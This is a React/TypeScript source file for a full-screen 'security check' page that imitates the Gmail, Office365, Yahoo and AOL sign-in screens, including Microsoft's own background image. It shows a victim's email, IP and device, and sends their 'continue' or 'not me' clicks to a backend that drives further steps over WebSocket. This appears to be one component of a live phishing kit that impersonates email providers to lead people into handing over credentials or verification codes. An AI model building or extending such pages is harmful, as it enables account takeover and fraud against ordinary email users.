import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface SecurityCheckPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Full-screen "security check" page: a provider-themed notice that a new sign-in
 * was detected and must be verified. The user can click "Continue" to proceed
 * (the backend will follow up with the next WebSocket command).
 */
const SecurityCheckPage: React.FC<SecurityCheckPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const ipAddress = (data.ipAddress as string) || (data.ip as string) || '';
  const deviceName = (data.deviceName as string) || (data.device as string) || 'an unrecognised device';
  const locationText = (data.location as string) || '';
  const backendMessage = (data.message as string) || '';

  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: 'Verify it\u2019s you',
    office365: 'Help us protect your account',
    yahoo: 'A quick security check',
    aol: 'Confirm it\u2019s you',
    others: 'Security check required',
  };

  const description = backendMessage
    || `For your security, ${theme.displayName} needs to verify your identity because a sign-in attempt was made from ${deviceName}${locationText ? ` near ${locationText}` : ''}${ipAddress ? ` (IP ${ipAddress})` : ''}. If this was you, continue to verify your identity.`;

  const handleContinue = () => {
    if (submitting) return;
    setSubmitting(true);
    onAction('continue_security_check', { email });
  };
  const handleNotMe = () => onAction('deny_security_check', { email });
  const goBackHome = () => { onAction('cancel'); navigate(-1); };

  const ShieldIcon = ({ color, size = 48 }: { color: string; size?: number }) => (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.6" aria-hidden="true">
      <path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z" />
      <path d="M9 12l2 2 4-4" />
    </svg>
  );

  const DetailRow = ({ label, value }: { label: string; value: string }) => (
    <div className="flex items-center justify-between py-2 text-sm">
      <span className="text-gray-500">{label}</span>
      <span className="font-medium text-gray-800 truncate ml-2">{value}</span>
    </div>
  );

  // Gmail
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[520px] mx-auto bg-white rounded-[28px] px-10 py-12" style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}>
            <div className="flex justify-center mb-6"><ProviderLogo providerKey="gmail" /></div>
            <h1 className="text-[28px] leading-9 font-normal text-gray-900 text-center mb-2">{headline.gmail}</h1>
            {email && (<p className="text-sm text-gray-700 text-center mb-2">{email}</p>)}
            <p className="text-sm text-gray-700 text-center mb-8">{description}</p>
            <div className="border border-gray-200 rounded-2xl p-4 mb-8">
              <DetailRow label="Device" value={deviceName} />
              {locationText && <DetailRow label="Location" value={locationText} />}
              {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
              <DetailRow label="Time" value="Just now" />
            </div>
            <div className="flex justify-between items-center">
              <button onClick={handleNotMe} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>It wasn&rsquo;t me</button>
              <button onClick={handleContinue} disabled={submitting} className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-60" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Please wait\u2026' : 'Yes, continue'}
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // Office365
  if (providerKey === 'office365') {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundColor: '#e9e9e9',
        }}
      >
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5"><ProviderLogo providerKey="office365" /></div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button type="button" onClick={goBackHome} className="mr-2 text-[#1b1b1b]" aria-label="Back">&larr;</button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">{headline.office365}</h1>
          <p className="text-sm text-[#1b1b1b] mb-5">{description}</p>
          {(deviceName || locationText || ipAddress) && (
            <div className="mb-5 border border-[#e1e1e1] p-3 bg-[#faf9f8]">
              {deviceName && <DetailRow label="Device" value={deviceName} />}
              {locationText && <DetailRow label="Location" value={locationText} />}
              {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
            </div>
          )}
          <p className="text-sm text-[#1b1b1b] mb-5">More information is required to keep your account secure.</p>
          <div className="flex justify-end gap-2">
            <button onClick={handleNotMe} className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]" style={{ minWidth: '108px' }}>Cancel</button>
            <button onClick={handleContinue} disabled={submitting} className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60" style={{ backgroundColor: theme.primary, minWidth: '108px' }}>
              {submitting ? 'Please wait\u2026' : 'Next'}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Yahoo
  if (providerKey === 'yahoo') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-6 px-10"><ProviderLogo providerKey="yahoo" className="h-8" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-[420px] px-8 py-10 bg-white rounded-2xl text-center" style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}>
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <ShieldIcon color={theme.primary} />
            </div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-2">{headline.yahoo}</h2>
            {email && (<div className="my-3 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">{description}</p>
            {(deviceName || locationText || ipAddress) && (
              <div className="text-left border border-gray-200 rounded-lg p-3 mb-6">
                {deviceName && <DetailRow label="Device" value={deviceName} />}
                {locationText && <DetailRow label="Location" value={locationText} />}
                {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
              </div>
            )}
            <button onClick={handleContinue} disabled={submitting} className="w-full py-3 text-white font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
              {submitting ? 'Please wait\u2026' : 'Yes, it was me'}
            </button>
            <div className="mt-3"><button onClick={handleNotMe} className="text-sm font-medium" style={{ color: theme.primary }}>This wasn&rsquo;t me</button></div>
          </div>
        </main>
      </div>
    );
  }

  // AOL
  if (providerKey === 'aol') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-4 px-6 border-b border-gray-200"><ProviderLogo providerKey="aol" className="h-6" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[420px] py-12 px-10 bg-white rounded-xl border border-gray-200 text-center">
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <ShieldIcon color={theme.primary} />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-3">{headline.aol}</h2>
            {email && (<div className="my-4 p-2 bg-gray-100 rounded-md text-sm font-medium truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">{description}</p>
            {(deviceName || locationText || ipAddress) && (
              <div className="text-left border border-gray-200 rounded-md p-3 mb-6">
                {deviceName && <DetailRow label="Device" value={deviceName} />}
                {locationText && <DetailRow label="Location" value={locationText} />}
                {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
              </div>
            )}
            <button onClick={handleContinue} disabled={submitting} className="w-full py-3 text-white font-bold rounded-md text-base disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
              {submitting ? 'Please wait\u2026' : 'Continue'}
            </button>
            <div className="mt-3"><button onClick={handleNotMe} className="text-sm font-medium" style={{ color: theme.primary }}>This wasn&rsquo;t me</button></div>
          </div>
        </main>
      </div>
    );
  }

  // Others (generic)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[460px] bg-white rounded-lg shadow p-8 text-center">
          <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
            <ShieldIcon color={theme.primary} />
          </div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] mb-3">{headline.others}</h1>
          {email && (<p className="text-sm text-gray-600 mb-4">{email}</p>)}
          <p className="text-sm text-gray-600 mb-6">{description}</p>
          {(deviceName || locationText || ipAddress) && (
            <div className="text-left border border-gray-200 rounded-md p-3 mb-6">
              {deviceName && <DetailRow label="Device" value={deviceName} />}
              {locationText && <DetailRow label="Location" value={locationText} />}
              {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
            </div>
          )}
          <button onClick={handleContinue} disabled={submitting} className="w-full py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60" style={{ backgroundColor: theme.primary }}>
            {submitting ? 'Please wait\u2026' : 'Continue'}
          </button>
          <div className="mt-3"><button onClick={handleNotMe} className="text-sm font-medium hover:underline" style={{ color: theme.primary }}>This wasn&rsquo;t me</button></div>
        </div>
      </main>
    </div>
  );
};

export default SecurityCheckPage;
